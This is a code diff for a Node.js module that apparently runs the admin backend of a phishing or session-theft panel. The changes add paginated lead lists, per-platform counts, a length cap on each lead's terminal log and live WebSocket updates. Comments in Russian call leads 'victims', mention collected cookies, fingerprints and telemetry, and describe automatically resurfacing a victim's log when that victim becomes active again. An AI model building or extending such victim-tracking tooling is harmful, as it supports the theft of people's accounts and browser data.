@@ -6,6 +6,10 @@ const {
   getDb,
   getAllLeads,
   getLeadById,
+  countLeadsForAdminList: dbCountLeadsForAdminList,
+  getLeadsAdminListPage: dbGetLeadsAdminListPage,
+  getLeadAdminListRowById: dbGetLeadAdminListRowById,
+  countLeadsByPlatformForAdmin: dbCountLeadsByPlatformForAdmin,
   getLeadIdByEmail,
   getAllLeadIdsByEmailNormalized,
   getStatsLeadSnapshotsByPeriod: dbGetStatsLeadSnapshotsByPeriod,
@@ -18,14 +22,15 @@ const {
   deleteLeadById: dbDeleteLeadById,
   deleteAllLeads: dbDeleteAllLeads,
   DATA_DIR,
+  LEAD_LOG_TERMINAL_MAX_CHARS,
 } = require('../db/database.js');
 
 const REPLACED_LEAD_IDS_FILE = path.join(DATA_DIR, 'replaced-lead-ids.json');
 
-function broadcastLeadsUpdate(leadId) {
+function broadcastLeadsUpdate(leadId, patch) {
   const id = leadId != null ? String(leadId).trim() : '';
   if (id && typeof global.__gmwWssBroadcastLeadUpdate === 'function') {
-    global.__gmwWssBroadcastLeadUpdate(id);
+    global.__gmwWssBroadcastLeadUpdate(id, patch);
     return;
   }
   if (typeof global.__gmwWssBroadcast === 'function') global.__gmwWssBroadcast();
@@ -211,7 +216,7 @@ function persistLeadPatch(leadId, patch, opts) {
   patchLeadsCacheById(idStr, clean);
   const skipBroadcast = !!(opts && opts.skipBroadcast);
   if (!skipBroadcast) {
-    broadcastLeadsUpdate(idStr);
+    broadcastLeadsUpdate(idStr, clean);
   }
   return true;
 }
@@ -227,7 +232,12 @@ function appendLeadLogTerminal(leadId, logLine) {
     const idx = _leadsCache.data.findIndex((l) => l && String(l.id) === idStr);
     if (idx !== -1) {
       const prev = _leadsCache.data[idx].logTerminal != null ? String(_leadsCache.data[idx].logTerminal) : '';
-      _leadsCache.data[idx].logTerminal = prev ? (prev + '\n' + line) : line;
+      const combined = (prev || '') + '\n' + line;
+      const tail =
+        combined.length <= LEAD_LOG_TERMINAL_MAX_CHARS
+          ? combined
+          : combined.slice(-LEAD_LOG_TERMINAL_MAX_CHARS);
+      _leadsCache.data[idx].logTerminal = tail;
     }
   }
   if (typeof global.__gmwWssBroadcastLogAppended === 'function') {
@@ -418,6 +428,27 @@ function unhideLeadInAdminSidebar(leadId, opts) {
  * Если лог был скрыт (adminLogArchived/klLogArchived), но жертва проявила активность —
  * автоматически вернуть в активный список, если НЕ "Отработан".
  */
+/** Список админки: пагинация и урезанные колонки (без fingerprint, telemetry, cookies-тела, …). */
+function countLeadsForAdminList(includeArchived) {
+  ensureDataReady();
+  return dbCountLeadsForAdminList(!!includeArchived);
+}
+
+function getLeadsAdminListPage(includeArchived, limit, offset) {
+  ensureDataReady();
+  return dbGetLeadsAdminListPage(!!includeArchived, limit, offset);
+}
+
+function getLeadAdminListRowById(id) {
+  ensureDataReady();
+  return dbGetLeadAdminListRowById(id);
+}
+
+function countLeadsByPlatformForAdmin(includeArchived) {
+  ensureDataReady();
+  return dbCountLeadsByPlatformForAdmin(!!includeArchived);
+}
+
 function tryAutoUnhideLeadAfterVictimActivity(leadId, opts) {
   opts = opts || {};
   const id = leadId != null ? String(leadId).trim() : '';
@@ -443,6 +474,10 @@ module.exports = {
   invalidateLeadsCache,
   readLeads,
   readLeadsAsync,
+  countLeadsForAdminList,
+  getLeadsAdminListPage,
+  getLeadAdminListRowById,
+  countLeadsByPlatformForAdmin,
   readLeadById,
   findLeadIdByEmail,
   findAllLeadIdsByEmailNormalized,
